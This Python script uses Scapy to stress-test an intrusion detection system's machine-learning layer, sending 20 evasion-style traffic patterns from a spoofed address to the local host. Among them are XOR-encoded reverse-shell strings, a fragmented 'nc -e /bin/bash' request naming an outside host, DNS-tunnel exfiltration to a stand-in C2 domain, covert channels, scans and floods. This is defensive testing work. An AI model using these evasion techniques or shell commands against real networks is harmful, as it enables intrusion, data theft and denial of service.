#!/usr/bin/env python3
"""
IDS ML Layer Stress Test
══════════════════════════════════════════════════════════════
These tests are designed to BYPASS the heuristic layer and
force the ML model (Layer 2) to make decisions based on:

  • Flow statistics   (packet rate, byte rate, ratios)
  • Entropy analysis  (randomness of payload bytes)
  • Protocol anomalies (wrong flags, malformed headers)
  • Behavioural patterns (beaconing, slow-and-low, bursting)
  • Covert channels   (data hidden in header fields)

NONE of these contain the known signature strings that the
heuristic layer watches for — they are all obfuscated,
encoded, fragmented, or structurally anomalous.

Run as Administrator:
    python ids_ml_tests.py
"""

import sys, time, random, socket, struct, base64, os, math
from itertools import cycle

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, Raw, DNS, DNSQR,
        send, conf, fragment,
        Ether, sendp,
    )
    conf.verb = 0
except ImportError:
    print("pip install scapy")
    sys.exit(1)

MY_IP  = socket.gethostbyname(socket.gethostname())
BASE   = MY_IP.rsplit(".", 1)[0]
FAKE   = f"{BASE}.210"

GRN = "\033[92m"; YEL = "\033[93m"; RED = "\033[91m"
CYN = "\033[96m"; MAG = "\033[95m"; RST = "\033[0m"

def banner(n, title, subtitle=""):
    print(f"\n{CYN}{'━'*62}{RST}")
    print(f"{CYN}  TEST {n:02d}  —  {title}{RST}")
    if subtitle:
        print(f"         {YEL}{subtitle}{RST}")
    print(f"{CYN}{'━'*62}{RST}")

def ok(msg):   print(f"  {GRN}✓{RST}  {msg}")
def info(msg): print(f"  {CYN}→{RST}  {msg}")
def gap():     time.sleep(0.8)


# ══════════════════════════════════════════════════════════════════════════════
#  HELPER: generate high-entropy random payload
#  ML models flag high-entropy data on non-encrypted ports as suspicious
# ══════════════════════════════════════════════════════════════════════════════
def entropy_payload(size: int) -> bytes:
    """Pure random bytes — entropy ≈ 7.99 bits/byte (max possible)."""
    return os.urandom(size)

def low_entropy_payload(size: int, char=b"A") -> bytes:
    """Repeating single byte — entropy ≈ 0. Used as control."""
    return char * size

def xor_encode(data: bytes, key: int = 0x41) -> bytes:
    """XOR encode payload — evades string matching, keeps high entropy."""
    return bytes(b ^ key for b in data)

def b64_encode(data: bytes) -> bytes:
    """Base64 encode without 'base64' keyword in packet."""
    return base64.b64encode(data)

def hex_encode(data: bytes) -> bytes:
    return data.hex().encode()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 01 — XOR-OBFUSCATED REVERSE SHELL
#  The payload bytes are XOR'd so no plaintext signature matches.
#  ML detects: high entropy on port 4444 + unusual byte distribution
# ══════════════════════════════════════════════════════════════════════════════
def test_xor_obfuscated():
    banner(1, "XOR-Obfuscated Payload on Port 4444",
           "Heuristic: MISS (no plain text match)  |  ML: HIT (entropy+port)")

    raw = b"nc -e /bin/bash HOST PORT"           # would normally match
    encoded_payloads = [
        xor_encode(raw, 0x55),                   # XOR key 0x55
        xor_encode(raw, 0x13),                   # XOR key 0x13
        xor_encode(b"bash -i >& /dev/tcp/H/P 0>&1", 0x7F),
        xor_encode(b"python3 -c exec(decode())", 0x42),
    ]
    for i, payload in enumerate(encoded_payloads):
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=50100+i, dport=4444, flags="PA") /
            Raw(load=payload)
        )
        ok(f"XOR(key=0x{[0x55,0x13,0x7F,0x42][i]:02X}) payload {len(payload)}B → port 4444")
        time.sleep(0.2)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 02 — SLOW-AND-LOW PORT SCAN
#  One SYN every 2 seconds — below fast-scan threshold.
#  ML detects: sustained low-rate connection attempts across many ports
# ══════════════════════════════════════════════════════════════════════════════
def test_slow_scan():
    banner(2, "Slow-and-Low Port Scan (1 SYN per 0.8s)",
           "Heuristic: MISS (below rate threshold)  |  ML: HIT (sustained pattern)")

    ports = [22, 23, 25, 80, 110, 135, 143, 443, 445, 993,
             1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 5000]
    info(f"Scanning {len(ports)} ports slowly over {len(ports)*0.8:.0f} seconds")
    for port in ports:
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=random.randint(49152,65535), dport=port, flags="S")
        )
        ok(f"SYN → port {port:<6}")
        time.sleep(0.8)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 03 — C2 BEACONING PATTERN
#  Regular outbound connections at fixed intervals — C2 heartbeat.
#  ML detects: periodic regularity in inter-arrival times (low jitter)
# ══════════════════════════════════════════════════════════════════════════════
def test_c2_beaconing():
    banner(3, "C2 Beaconing — Regular 3s Heartbeat",
           "Heuristic: MISS (normal port/payload)  |  ML: HIT (timing regularity)")

    info("Sending 15 beacons at exactly 3-second intervals")
    info("Real C2 malware (Cobalt Strike etc) uses this pattern")
    beacon_payload = b64_encode(b"ALIVE|" + MY_IP.encode() + b"|check-in")
    for i in range(15):
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=52000, dport=443, flags="PA") /
            Raw(load=beacon_payload + f"|seq={i}".encode())
        )
        ok(f"Beacon #{i+1:02d}  payload={len(beacon_payload)}B  interval=3.00s")
        time.sleep(3.0)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 04 — TCP CHRISTMAS TREE SCAN
#  All TCP flags set simultaneously — used for OS fingerprinting.
#  Heuristic won't catch it (not in SUSPICIOUS_PORTS or payload sigs).
#  ML detects: impossible flag combination, anomalous flow stats
# ══════════════════════════════════════════════════════════════════════════════
def test_xmas_scan():
    banner(4, "TCP Christmas Tree Scan (ALL flags set)",
           "Heuristic: MISS (no signature)  |  ML: HIT (flag anomaly)")

    targets = [22, 80, 135, 139, 443, 445, 3389, 8080, 8443, 9090,
               1433, 3306, 5432, 6379, 27017, 5900, 111, 2049, 512, 514]
    for port in targets:
        # FIN+PSH+URG = Christmas tree
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=random.randint(49152,65535), dport=port,
                flags="FPU",          # FIN + PUSH + URG
                window=0,             # zero window — also anomalous
                urgptr=0xFFFF)        # max urgent pointer
        )
        ok(f"XMAS (FIN+PSH+URG) → port {port}")
        time.sleep(0.1)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 05 — TCP NULL SCAN
#  No flags set (flags=0). RFC says this is invalid.
#  ML detects: statistically rare flag pattern in flow records
# ══════════════════════════════════════════════════════════════════════════════
def test_null_scan():
    banner(5, "TCP NULL Scan (zero flags)",
           "Heuristic: MISS  |  ML: HIT (invalid TCP state)")

    ports = [21,22,23,25,53,80,110,443,445,3389,8080]
    for port in ports:
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=random.randint(49152,65535), dport=port,
                flags=0)              # no flags at all — invalid
        )
        ok(f"NULL scan → port {port}")
        time.sleep(0.1)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 06 — HIGH-ENTROPY PAYLOAD BURST (non-encrypted port)
#  Random bytes sent to port 80 (HTTP) — looks like encrypted C2 over HTTP.
#  ML detects: entropy ~7.99 on a port that normally carries readable text
# ══════════════════════════════════════════════════════════════════════════════
def test_high_entropy_http():
    banner(6, "High-Entropy Payload on Port 80 (HTTP)",
           "Heuristic: MISS (no keywords)  |  ML: HIT (entropy anomaly)")

    info("Normal HTTP text entropy ≈ 4.5 bits/byte")
    info("These payloads have entropy ≈ 7.99 bits/byte (encrypted C2 over HTTP)")
    for i in range(12):
        payload = entropy_payload(random.randint(512, 1400))
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=53000+i, dport=80, flags="PA") /
            Raw(load=payload)
        )
        # calculate actual entropy
        from collections import Counter
        counts = Counter(payload)
        ent = -sum((c/len(payload)) * math.log2(c/len(payload))
                   for c in counts.values())
        ok(f"Pkt {i+1:02d}  size={len(payload):<5}B  entropy={ent:.2f} bits/byte")
        time.sleep(0.15)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 07 — FRAGMENTED PAYLOAD ATTACK
#  Attack payload split across multiple tiny IP fragments.
#  Each fragment is harmless alone — reassembled it forms an attack.
#  Heuristic only sees fragments, never the full payload.
#  ML detects: unusual fragment sizes, high fragment ratio in flow
# ══════════════════════════════════════════════════════════════════════════════
def test_fragmented_attack():
    banner(7, "Fragmented Payload (split across IP fragments)",
           "Heuristic: MISS (never sees full payload)  |  ML: HIT (fragment anomaly)")

    full_payload = (
        b"GET /shell?cmd=" +
        b"nc" + b" " + b"-" + b"e" + b" " +  # fragmented so no "nc -e" match
        b"/bin/bash 192.168.200.99 4444\r\n\r\n"
    )
    # Build the IP packet and fragment it into 8-byte chunks
    pkt = IP(src=FAKE, dst=MY_IP) / TCP(dport=80, flags="PA") / Raw(load=full_payload)
    frags = fragment(pkt, fragsize=8)
    info(f"Full payload: {len(full_payload)} bytes → split into {len(frags)} fragments of 8 bytes")
    for i, frag in enumerate(frags):
        send(frag)
        ok(f"Fragment {i+1:02d}/{len(frags)}  offset={frag[IP].frag * 8}B")
        time.sleep(0.05)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 08 — DNS TUNNELING SIMULATION
#  Data exfiltration hidden inside DNS query subdomains.
#  Each "query" carries 30 bytes of encoded data in the subdomain label.
#  ML detects: high query rate, long subdomain labels, high label entropy
# ══════════════════════════════════════════════════════════════════════════════
def test_dns_tunneling():
    banner(8, "DNS Tunneling — Data Exfiltration via DNS",
           "Heuristic: MISS (valid DNS format)  |  ML: HIT (label entropy+rate)")

    secret_data = b"EXFILTRATED: passwd file contents would go here"
    chunks = [secret_data[i:i+20] for i in range(0, len(secret_data), 20)]
    info(f"Exfiltrating {len(secret_data)} bytes via {len(chunks)} DNS queries")
    for i, chunk in enumerate(chunks):
        label = base64.b32encode(chunk).decode().lower().rstrip("=")
        fqdn  = f"{label}.tunnel.evil-c2.test"
        send(
            IP(src=FAKE, dst=MY_IP) /
            UDP(sport=random.randint(49152,65535), dport=53) /
            DNS(rd=1, qd=DNSQR(qname=fqdn))
        )
        ok(f"DNS query: {fqdn[:55]}")
        time.sleep(0.3)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 09 — COVERT CHANNEL IN TCP HEADERS
#  Data hidden in the TCP sequence number and urgent pointer fields.
#  Payload field is empty — nothing to scan for signatures.
#  ML detects: anomalous sequence number distribution, URG pointer usage
# ══════════════════════════════════════════════════════════════════════════════
def test_covert_channel():
    banner(9, "Covert Channel — Data Hidden in TCP Header Fields",
           "Heuristic: MISS (empty payload)  |  ML: HIT (header field anomaly)")

    secret = b"SECRET_DATA_EXFIL"
    info(f"Encoding '{secret.decode()}' in TCP seq/urg fields — NO payload bytes")
    for i, byte_val in enumerate(secret):
        # encode one byte in sequence number LSB, one in urgent pointer
        seq_num = (0xDEAD0000) | (byte_val << 8) | i
        urg_ptr = byte_val
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(
                sport=54000+i,
                dport=80,
                flags="U",            # URG flag to make urgptr valid
                seq=seq_num,
                urgptr=urg_ptr,
            )
            # NO Raw() layer — payload is completely empty
        )
        ok(f"Byte[{i:02d}]=0x{byte_val:02X} encoded in seq=0x{seq_num:08X} urg=0x{urg_ptr:02X}")
        time.sleep(0.15)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 10 — PROTOCOL ANOMALY: WRONG FLAGS FOR STATE
#  RST-ACK, SYN-FIN, SYN-RST — combinations that cannot exist in a
#  legitimate TCP handshake.
#  ML detects: impossible state machine transitions in flow
# ══════════════════════════════════════════════════════════════════════════════
def test_protocol_anomaly_flags():
    banner(10, "Protocol Anomaly — Impossible TCP Flag Combinations",
           "Heuristic: MISS  |  ML: HIT (TCP state machine violation)")

    anomalies = [
        ("SA",   "SYN+ACK without prior SYN from server — spoofed handshake"),
        ("FS",   "FIN+SYN — connection open and close simultaneously"),
        ("RS",   "RST+SYN — reset a connection being opened"),
        ("FPA",  "FIN+PSH+ACK — terminate while pushing data"),
        ("FSRPA","ALL data flags set — meaningless combination"),
    ]
    for flags, desc in anomalies:
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=random.randint(49152,65535),
                dport=random.choice([80,443,22,3389]),
                flags=flags)
        )
        ok(f"flags={flags:<7}  {desc}")
        time.sleep(0.2)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 11 — LARGE WINDOW / ACK FLOOD
#  High volume of pure ACK packets — no SYN, no data.
#  Used to exhaust connection state tables.
#  ML detects: ACK-only flow with zero data bytes, abnormal ACK/SYN ratio
# ══════════════════════════════════════════════════════════════════════════════
def test_ack_flood():
    banner(11, "ACK Flood — State Table Exhaustion",
           "Heuristic: MISS (no payload)  |  ML: HIT (ACK:SYN ratio anomaly)")

    info("Sending 150 pure ACK packets — no SYN, no data")
    for i in range(150):
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(
                sport=random.randint(1024,65535),
                dport=80,
                flags="A",
                seq=random.randint(0, 0xFFFFFFFF),
                ack=random.randint(0, 0xFFFFFFFF),
                window=65535,
            )
        )
    ok("ACK flood: 150 packets sent (ack_count >> syn_count → anomalous ratio)")
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 12 — POLYMORPHIC PAYLOAD (changes every packet)
#  Same logical attack, different byte layout each time — evades static sigs.
#  ML detects: sustained anomalous flow to same port despite signature evasion
# ══════════════════════════════════════════════════════════════════════════════
def test_polymorphic():
    banner(12, "Polymorphic Payload — Different Bytes Every Packet",
           "Heuristic: MISS (no repeating pattern)  |  ML: HIT (flow stats)")

    def make_variant(i):
        # Rotate the payload differently each time
        cmd  = b"exec(compile(b''.join(chr(x)for x in PAYLOAD),'','exec'))"
        key  = (i * 37 + 13) % 256
        junk = os.urandom(random.randint(10, 50))   # random prefix
        return junk + xor_encode(cmd, key) + os.urandom(8)

    info("Each packet has unique bytes — no two are alike")
    for i in range(15):
        payload = make_variant(i)
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=55000+i, dport=4444, flags="PA") /
            Raw(load=payload)
        )
        ok(f"Variant {i+1:02d}  len={len(payload)}  first4=0x{payload[:4].hex()}")
        time.sleep(0.2)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 13 — BURST THEN IDLE (APT Exfil Pattern)
#  Short bursts of traffic followed by long silence — mimics APT data theft.
#  ML detects: bursty inter-arrival time distribution, duty cycle anomaly
# ══════════════════════════════════════════════════════════════════════════════
def test_burst_idle():
    banner(13, "APT Exfil Pattern — Burst → Idle → Burst → Idle",
           "Heuristic: MISS  |  ML: HIT (bursty duty-cycle in flow timing)")

    info("3 burst episodes × 20 packets, separated by 5s idle — APT C2 pattern")
    for episode in range(3):
        info(f"Episode {episode+1}/3 — sending burst of 20 packets")
        for i in range(20):
            payload = entropy_payload(random.randint(200, 600))
            send(
                IP(src=FAKE, dst=MY_IP) /
                TCP(sport=56000+episode*100+i, dport=443, flags="PA") /
                Raw(load=payload)
            )
            time.sleep(0.02)   # fast burst
        ok(f"Burst {episode+1} complete — waiting 5s (idle)")
        time.sleep(5.0)        # long idle
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 14 — ABNORMAL PACKET SIZE DISTRIBUTION
#  All packets are exactly the same size — not how real traffic looks.
#  Real HTTP varies; fixed-size packets = crypto protocol or C2 framing.
#  ML detects: zero variance in packet length distribution
# ══════════════════════════════════════════════════════════════════════════════
def test_fixed_size_packets():
    banner(14, "Fixed-Size Packet Stream (zero length variance)",
           "Heuristic: MISS  |  ML: HIT (packet size distribution anomaly)")

    FIXED = 333   # odd fixed size — no protocol uses this
    info(f"Sending 30 packets, ALL exactly {FIXED} bytes — variance = 0")
    for i in range(30):
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=57000+i, dport=443, flags="PA") /
            Raw(load=os.urandom(FIXED - 40))   # 40 = IP+TCP headers
        )
        time.sleep(0.1)
    ok(f"Fixed-size stream: 30 × {FIXED}B  (stddev≈0 → anomalous)")
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 15 — SYN-ONLY FLOWS (half-open connections)
#  SYN sent but never completed — stealth scan leaves no full connections.
#  ML detects: SYN:FIN ratio >> 1, zero completed handshakes
# ══════════════════════════════════════════════════════════════════════════════
def test_half_open_flood():
    banner(15, "Half-Open SYN Flood (syn_count >> fin_count)",
           "Heuristic: MISS (rate under threshold)  |  ML: HIT (SYN/FIN ratio)")

    ports = list(range(1, 100))
    info(f"Sending SYN-only to {len(ports)} ports — never ACK, never FIN")
    for port in ports:
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=random.randint(49152,65535), dport=port,
                flags="S", window=1024)
        )
        time.sleep(0.05)
    ok(f"syn_count=100  fin_count=0  →  ratio=∞  (ML flags as scanner)")
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 16 — UNICODE / UTF-8 ENCODED ATTACK
#  Attack keywords encoded as unicode escapes — bypass ASCII pattern matchers.
#  ML detects: high non-ASCII byte ratio, unusual byte value distribution
# ══════════════════════════════════════════════════════════════════════════════
def test_unicode_encoded():
    banner(16, "Unicode / Multi-byte Encoded Attack Strings",
           "Heuristic: MISS (ASCII pattern match fails)  |  ML: HIT (byte stats)")

    # "SELECT" encoded in various ways that evade simple pattern matching
    variants = [
        "S\u0045LECT * FR\u004FM users".encode("utf-8"),        # unicode mid-string
        "%53%45%4C%45%43%54%20%2A".encode(),                    # URL percent encoding
        "&#83;&#69;&#76;&#69;&#67;&#84;".encode(),              # HTML entities
        b"\x53\x45\x4c\x45\x43\x54\x20\x2a\x20\x46\x52\x4f\x4d",  # hex literal
        "SELEC\tT * FROM".encode(),                              # tab injection
    ]
    for i, payload in enumerate(variants):
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=58000+i, dport=80, flags="PA") /
            Raw(load=b"GET /?" + payload + b" HTTP/1.1\r\n\r\n")
        )
        ok(f"Variant {i+1}: {payload[:40]}")
        time.sleep(0.3)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 17 — LOW-AND-SLOW HTTP ATTACK (Slowloris simulation)
#  Send partial HTTP headers, then one byte every few seconds.
#  ML detects: extremely low byte rate, high duration, minimal data per packet
# ══════════════════════════════════════════════════════════════════════════════
def test_slowloris():
    banner(17, "Slowloris-Style Low-and-Slow HTTP",
           "Heuristic: MISS  |  ML: HIT (duration/byte-rate anomaly)")

    info("Sending HTTP headers 1 byte at a time with 1s delay")
    info("A real Slowloris holds web server connections open indefinitely")
    partial_header = b"GET / HTTP/1.1\r\nHost: target\r\nX-a: "
    # Send header byte by byte
    for i, byte in enumerate(partial_header):
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=59000, dport=80, flags="PA",
                seq=i) /
            Raw(load=bytes([byte]))
        )
        time.sleep(0.5)
    ok(f"Sent {len(partial_header)} bytes over {len(partial_header)*0.5:.0f}s  (rate={len(partial_header)/(len(partial_header)*0.5):.1f} B/s)")
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 18 — ICMP COVERT CHANNEL
#  Data exfiltrated by varying the ICMP payload in each ping request.
#  ML detects: ICMP payload entropy > normal ping, non-standard payload sizes
# ══════════════════════════════════════════════════════════════════════════════
def test_icmp_covert():
    banner(18, "ICMP Covert Channel — Exfil Data in Ping Payload",
           "Heuristic: MISS (valid ICMP)  |  ML: HIT (payload entropy in ICMP)")

    secret = b"EXFIL: /etc/shadow contents simulated here for IDS test"
    info(f"Hiding {len(secret)} bytes across ICMP echo requests")
    for i, chunk_start in enumerate(range(0, len(secret), 8)):
        chunk = secret[chunk_start:chunk_start+8].ljust(8, b"\x00")
        # Normal ping has fixed repeating payload (abcdefgh...)
        # This has varying high-entropy payload — detectable
        send(
            IP(src=FAKE, dst=MY_IP) /
            ICMP(type=8, code=0, id=0x1337, seq=i) /
            Raw(load=chunk + os.urandom(48))  # 8B data + 48B noise
        )
        ok(f"ICMP seq={i}  data={chunk.rstrip(b'\\x00')}")
        time.sleep(0.4)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 19 — ABNORMAL TTL VALUES
#  TTL of 1 or 255 — used in traceroute probes and OS fingerprinting.
#  ML detects: TTL distribution outside normal OS defaults (64/128)
# ══════════════════════════════════════════════════════════════════════════════
def test_abnormal_ttl():
    banner(19, "Abnormal TTL Values (OS fingerprinting / traceroute probe)",
           "Heuristic: MISS  |  ML: HIT (TTL distribution anomaly)")

    ttl_values = [1, 2, 3, 127, 255, 0xFF, 33, 64, 128, 200]
    for ttl in ttl_values:
        send(
            IP(src=FAKE, dst=MY_IP, ttl=ttl) /
            TCP(sport=random.randint(49152,65535), dport=80, flags="S")
        )
        ok(f"TTL={ttl:<4}  (normal Linux=64, Windows=128 — others are anomalous)")
        time.sleep(0.2)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  TEST 20 — REPLAY ATTACK SIMULATION
#  Same exact packet sent repeatedly — identical seq/ack numbers.
#  ML detects: zero seq number variance, identical packet hashes across flow
# ══════════════════════════════════════════════════════════════════════════════
def test_replay_attack():
    banner(20, "Replay Attack — Identical Packets Repeated",
           "Heuristic: MISS  |  ML: HIT (zero seq variance, identical packets)")

    fixed_seq = 0xDEADBEEF
    fixed_payload = b"AUTH: token=abc123xyz"   # replayed auth token
    info(f"Replaying same packet 25 times with fixed seq=0x{fixed_seq:08X}")
    for i in range(25):
        send(
            IP(src=FAKE, dst=MY_IP) /
            TCP(sport=60000, dport=443, flags="PA",
                seq=fixed_seq, ack=0x12345678) /
            Raw(load=fixed_payload)
        )
        ok(f"Replay {i+1:02d}/25  seq=0x{fixed_seq:08X}  payload={fixed_payload}")
        time.sleep(0.1)
    gap()


# ══════════════════════════════════════════════════════════════════════════════
#  MENU
# ══════════════════════════════════════════════════════════════════════════════
TESTS = [
    ("XOR-Obfuscated Payload",                  test_xor_obfuscated),
    ("Slow-and-Low Port Scan",                  test_slow_scan),
    ("C2 Beaconing (3s heartbeat)",             test_c2_beaconing),
    ("TCP Christmas Tree Scan",                 test_xmas_scan),
    ("TCP NULL Scan",                           test_null_scan),
    ("High-Entropy HTTP (encrypted C2)",        test_high_entropy_http),
    ("Fragmented Payload Attack",               test_fragmented_attack),
    ("DNS Tunneling Exfiltration",              test_dns_tunneling),
    ("Covert Channel in TCP Headers",           test_covert_channel),
    ("Protocol Anomaly — Impossible Flags",     test_protocol_anomaly_flags),
    ("ACK Flood — State Table Exhaustion",      test_ack_flood),
    ("Polymorphic Payload",                     test_polymorphic),
    ("APT Burst-Idle Pattern",                  test_burst_idle),
    ("Fixed-Size Packet Stream",                test_fixed_size_packets),
    ("Half-Open SYN (syn/fin anomaly)",         test_half_open_flood),
    ("Unicode Encoded Attack Strings",          test_unicode_encoded),
    ("Slowloris Low-and-Slow HTTP",             test_slowloris),
    ("ICMP Covert Channel",                     test_icmp_covert),
    ("Abnormal TTL Fingerprinting",             test_abnormal_ttl),
    ("Replay Attack",                           test_replay_attack),
]

if __name__ == "__main__":
    print(f"""
{CYN}╔══════════════════════════════════════════════════════════════╗
║   IDS ML Layer Stress Test  —  20 Evasion Techniques         ║
║   All tests designed to BYPASS heuristics → force ML layer   ║
╚══════════════════════════════════════════════════════════════╝{RST}

  Your IP  : {MY_IP}
  Fake src : {FAKE}

  These tests evade string-matching heuristics.
  The ML model should detect them via flow statistics.

  ┌──────────────────────────────────────────────────────────┐
  │  What each test bypasses and what the ML should catch    │
  ├──────────────────────────────────────────────────────────┤
  │  01  XOR encoding       → entropy on suspicious port     │
  │  02  Slow scan rate     → sustained scan pattern         │
  │  03  C2 beaconing       → timing regularity              │
  │  04  XMAS scan          → impossible TCP flags           │
  │  05  NULL scan          → zero-flag TCP packets          │
  │  06  Encrypted over HTTP→ entropy anomaly on port 80     │
  │  07  Fragmented payload → fragment ratio in flow         │
  │  08  DNS tunneling      → DNS label entropy/rate         │
  │  09  TCP header covert  → header field distribution      │
  │  10  Impossible flags   → state machine violation        │
  │  11  ACK flood          → ACK:SYN ratio = ∞              │
  │  12  Polymorphic bytes  → sustained flow stats           │
  │  13  APT burst/idle     → duty-cycle anomaly             │
  │  14  Fixed packet sizes → zero length variance           │
  │  15  Half-open SYNs     → SYN:FIN ratio >> 1             │
  │  16  Unicode encoding   → byte distribution anomaly      │
  │  17  Slowloris HTTP     → duration/byterate anomaly      │
  │  18  ICMP covert chan   → ICMP payload entropy           │
  │  19  Abnormal TTL       → TTL distribution anomaly       │
  │  20  Replay attack      → zero sequence variance         │
  └──────────────────────────────────────────────────────────┘
""")
    for i, (name, _) in enumerate(TESTS, 1):
        print(f"  [{i:>2}]  {name}")
    print(f"\n  [ 0]  Run ALL 20 tests")
    print(f"  [ q]  Quit\n")

    choice = input("  Select: ").strip().lower()
    if choice == "q":
        sys.exit(0)
    elif choice == "0":
        print(f"\n  {YEL}Running all 20 ML evasion tests — watch your IDS!{RST}\n")
        time.sleep(2)
        for name, fn in TESTS:
            fn()
    else:
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(TESTS):
                TESTS[idx][1]()
            else:
                print("Invalid")
        except ValueError:
            print("Invalid")

    print(f"\n{GRN}  Done. Check IDS terminal for ML-layer alerts.{RST}\n")
